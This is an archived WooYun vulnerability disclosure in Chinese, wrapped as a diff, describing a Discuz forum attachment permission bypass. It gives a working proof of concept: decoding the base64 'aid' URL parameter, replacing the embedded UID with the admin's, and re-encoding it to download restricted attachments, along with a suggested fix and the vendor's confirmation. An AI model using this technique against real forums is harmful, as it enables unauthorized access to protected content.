@@ -1,0 +1,239 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Discuz附件下载权限绕过  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Discuz附件下载权限绕过  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Coxxs">Coxxs</a> 
+</li><li>提交时间：		2014-01-15 16:09</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-15：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-15：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-25：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-04：	细节向普通白帽子公开<br/>
+									2014-02-14：	细节向实习白帽子公开<br/>
+									2014-03-01：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">绕过附件下载权限只是漏洞的一个应用，还可以免费下载附件，其他的应用还没发掘..</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">在下载附件的时候，附件所设置的“阅读权限”可以被绕过。<br />
+<br />
+<br />
+<br />
+Discuz的附件下载地址是类似<br />
+<br />
+</p><pre><code>forum.php?mod=attachment&amp;aid=Nzg4fDQwNGQzYjMxfDEzODk2OTM4Mzh8MzEyNTR8MjY3Mw%3D%3D</code></pre><p class='detail'><br />
+<br />
+这样的地址，其中的aid参数是一串base64，解码后是：<br />
+<br />
+</p><pre><code>788|404d3b31|1389693838|31254|2673</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这串aid在source/module/forum/forum_attachment.php 中被这样解析<br />
+<br />
+</p><pre><code>@list($_GET[&#039;aid&#039;], $_GET[&#039;k&#039;], $_GET[&#039;t&#039;], $_GET[&#039;uid&#039;], $_GET[&#039;tableid&#039;]) = daddslashes(explode(&#039;|&#039;, base64_decode($_GET[&#039;aid&#039;])));</code></pre><p class='detail'><br />
+<br />
+之前提交的 788|404d3b31|1389693838|31254|2673 中的 31254 就是登录用户的UID，它被赋值进了 $_GET[&#039;uid&#039;] 变量。<br />
+<br />
+<br />
+<br />
+紧接着：<br />
+<br />
+</p><pre><code>if($_GET[&#039;uid&#039;] != $_G[&#039;uid&#039;] &amp;&amp; $_GET[&#039;uid&#039;]) {<br />
+	$_G[&#039;uid&#039;] = $_GET[&#039;uid&#039;] = intval($_GET[&#039;uid&#039;]);<br />
+	......<br />
+}</code></pre><p class='detail'><br />
+<br />
+如果用户提交的uid和当前登录的uid不同，DZ就会将用户所提交的uid赋值给discuz的全局使用变量$_G<br />
+<br />
+<br />
+<br />
+也就是说，用户可以在下载附件时，任意“伪造”自己的身份。<br />
+<br />
+但好在，这个php只能用于下载附件，不会造成更大的安全问题。<br />
+<br />
+但不可避免的，由于缺少了必要的过滤，还是会造成一些低危漏洞。<br />
+<br />
+<br />
+<br />
+这部分内容在漏洞证明中说明。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">越权下载含有“阅读权限”的插件、下载插件免扣币<br />
+<br />
+<br />
+<br />
+重现步骤：<br />
+<br />
+1、使用管理员账户，上传一个有高阅读权限的附件<br />
+<br />
+2、使用低权限的用户账户，下载附件，这个时候，Discuz会提示无权下载<br />
+<br />
+此时，浏览器中的附件地址形如<br />
+<br />
+</p><pre><code>forum.php?mod=attachment&amp;aid=Nzg4fDQwNGQzYjMxfDEzODk2OTM4Mzh8MzEyNTR8MjY3Mw%3D%3D</code></pre><p class='detail'><br />
+<br />
+解码aid<br />
+<br />
+</p><pre><code>788|404d3b31|1389693838|31254|2673</code></pre><p class='detail'><br />
+<br />
+修改其中的uid部分（这里将uid改成了管理员账户：1）<br />
+<br />
+</p><pre><code>788|404d3b31|1389693838|1|2673</code></pre><p class='detail'><br />
+<br />
+编码修改后的aid<br />
+<br />
+</p><pre><code>forum.php?mod=attachment&amp;aid=Nzg4fDQwNGQzYjMxfDEzODk2OTM4Mzh8MXwyNjcz</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+此时，成功下载原本需要高权限的附件<br />
+<br />
+<br />
+<br />
+另外下载的同时还可能会刷新用户的最后登录时间（我也因为这个巧合才发现这个漏洞的，因为某些cdn把地址里的base64全部小写了，造成解析错误，解析成了别人的uid，顺便刷新了最后登录时间） </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">附件下载是有key校验的，可以将uid也加入key校验中，防止用户随意修改 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Coxxs" title="Coxxs">Coxxs</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-048914" title="Discuz附件下载权限绕过">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：8 </p>
+													<p class="detail">确认时间：2014-01-15 16:54</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">此问题我们已经开始修复，谢谢您的建议</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="48914";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
